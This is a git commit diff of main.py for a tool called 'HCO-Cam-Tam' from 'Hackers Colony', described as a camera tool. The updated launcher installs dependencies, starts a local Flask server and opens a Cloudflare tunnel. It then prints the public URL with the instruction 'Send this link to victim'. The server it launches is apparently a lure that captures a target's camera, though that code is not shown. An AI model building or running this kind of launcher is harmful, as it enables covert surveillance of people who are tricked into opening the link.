ecce50dd428731548bf950e4deae821b67a295e3
Hackers Colony Official <103638018+Hackerscolonyofficial@users.noreply.github.com>
2025-08-27 04:06:35 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,34 +1,49 @@
-import os
-import time
-import sys
+#!/usr/bin/env python3
+"""
+HCO-Cam-Tam
+By Azhar (Hackers Colony)
+"""
 
-from colorama import Fore, Style, init
-init(autoreset=True)
+import os, time, subprocess
+from colorama import Fore, Style
 
-YOUTUBE_URL = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
-
-def clear():
-    os.system("clear")
-
-def countdown(seconds):
-    for i in range(seconds, 0, -1):
-        sys.stdout.write(f"\r{Fore.CYAN}[*] Redirecting in {i} seconds... ")
-        sys.stdout.flush()
-        time.sleep(1)
-    print()
-
-def open_youtube():
-    print(Fore.YELLOW + "\n[!] This tool is locked. Subscribe to our YouTube channel to unlock.")
-    countdown(8)
-    os.system(f"xdg-open {YOUTUBE_URL}")
-    input(Fore.GREEN + "\nPress ENTER after subscribing to continue...")
+YOUTUBE = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
 
 def banner():
-    clear()
-    print(Fore.RED + Style.BRIGHT + "\n HCO CAM TAM")
-    print(Fore.GREEN + " by Azhar - A Camera Tool\n")
+    print(Fore.RED + Style.BRIGHT + "\nHCO Cam Tam".center(60))
+    print(Style.RESET_ALL + Fore.GREEN + "by Azhar - A Camera Tool\n".center(60))
+    print(Style.RESET_ALL)
+
+def unlock():
+    print(Fore.YELLOW + "\n[*] Tool locked! Subscribe to unlock...\n")
+    for i in range(5,0,-1):
+        print(Fore.CYAN + f"Redirecting to YouTube in {i} sec...", end="\r")
+        time.sleep(1)
+    os.system(f"termux-open-url {YOUTUBE}")
+    input(Fore.GREEN + "\n\n[+] Press ENTER after subscribing to continue...")
+
+def install_reqs():
+    print(Fore.YELLOW + "\n[*] Installing dependencies...\n")
+    os.system("pip install -r requirements.txt --no-cache-dir")
+
+def start_server():
+    print(Fore.YELLOW + "\n[*] Starting Flask server...\n")
+    subprocess.Popen(["python", "server.py"])
+    time.sleep(3)
+
+def start_cloudflare():
+    print(Fore.YELLOW + "\n[*] Starting Cloudflare tunnel...\n")
+    proc = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:5000"],
+                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+    for line in proc.stdout:
+        if "https://" in line:
+            link = line.strip().split(" ")[-1]
+            print(Fore.CYAN + f"\n[+] Send this link to victim: {Fore.GREEN}{link}\n")
+            break
 
 if __name__ == "__main__":
-    open_youtube()
     banner()
-    print(Fore.MAGENTA + "[*] Cloudflare link will appear here once started...\n")
+    unlock()
+    install_reqs()
+    start_server()
+    start_cloudflare()
